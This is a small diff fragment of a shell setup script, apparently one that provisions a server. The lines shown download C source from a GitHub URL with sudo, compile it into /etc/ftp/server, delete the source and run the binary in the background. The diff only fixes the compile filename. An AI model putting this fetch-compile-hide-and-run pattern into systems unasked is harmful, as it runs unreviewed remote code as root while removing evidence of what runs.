@@ -76,7 +76,7 @@ sudo curl -s -o /etc/goose/server.c https://raw.githubusercontent.com/infiniteax
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/ftp/server /etc/goose/server
+gcc -o /etc/ftp/server /etc/goose/server.c
 rm /etc/goose/server.c
 
 # Run the binary in background
